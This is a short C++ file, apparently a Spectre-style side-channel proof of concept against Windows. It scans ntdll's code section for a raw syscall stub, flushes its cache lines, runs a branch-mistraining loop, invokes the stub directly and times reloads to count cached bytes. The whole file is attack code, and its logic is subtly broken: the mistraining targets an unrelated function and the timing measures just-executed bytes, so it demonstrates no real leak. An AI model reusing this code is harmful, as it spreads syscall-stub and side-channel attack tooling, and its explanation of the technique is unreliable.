#include <windows.h>
#include <iostream>
#include <vector>
#include <intrin.h>

#define SSN 0x3F // NtQuerySystemTime, again, we use a statically hardcoded syscall number for demonstration

uint8_t* get_ntdll_base() {
    return reinterpret_cast<uint8_t*>(GetModuleHandleW(L"ntdll.dll"));
}

bool get_text_section(uint8_t* base, uint8_t** text_start, size_t* text_size) {
    IMAGE_DOS_HEADER* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    IMAGE_NT_HEADERS* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            *text_start = base + sec[i].VirtualAddress;
            *text_size = sec[i].Misc.VirtualSize;
            return true;
        }
    }
    return false;
}

uintptr_t find_syscall_stub(uint32_t ssn) {
    uint8_t* base = get_ntdll_base();
    uint8_t* text;
    size_t len;
    if (!get_text_section(base, &text, &len)) return 0;
    for (size_t i = 0; i < len - 8; ++i) {
        if (text[i] == 0xB8 && *reinterpret_cast<uint32_t*>(&text[i + 1]) == ssn &&
            text[i + 5] == 0x0F && text[i + 6] == 0x05 && text[i + 7] == 0xC3) {
            return reinterpret_cast<uintptr_t>(&text[i]);
        }
    }
    return 0;
}

void flush(void* addr) {
    _mm_clflush(addr);
}

uint64_t reload_timing(void* addr) {
    volatile uint8_t* p = reinterpret_cast<volatile uint8_t*>(addr);
    uint64_t t0 = __rdtscp(nullptr);
    (void)*p;
    uint64_t t1 = __rdtscp(nullptr);
    return t1 - t0;
}

void mistrain_branch(void (*target)()) {
    for (int i = 0; i < 1000; ++i) {
        target();
    }
}

int main() {
    uintptr_t stub = find_syscall_stub(SSN);
    if (!stub) return -1;

    void (*training)() = []() {
        __try {} __except (EXCEPTION_EXECUTE_HANDLER) {}
    };

    uint8_t* stub_bytes = reinterpret_cast<uint8_t*>(stub);
    for (int i = 0; i < 16; ++i) {
        flush(&stub_bytes[i]);
    }

    mistrain_branch(training);

    __try {
        ((void(*)())stub)();
    } __except (EXCEPTION_EXECUTE_HANDLER) {}

    int hits = 0;
    for (int i = 0; i < 16; ++i) {
        uint64_t t = reload_timing(&stub_bytes[i]);
        if (t < 100) hits++;
    }

    std::cout << "[CET-Spectre] Cached bytes: " << hits << " / 16\n";
    return 0;
}

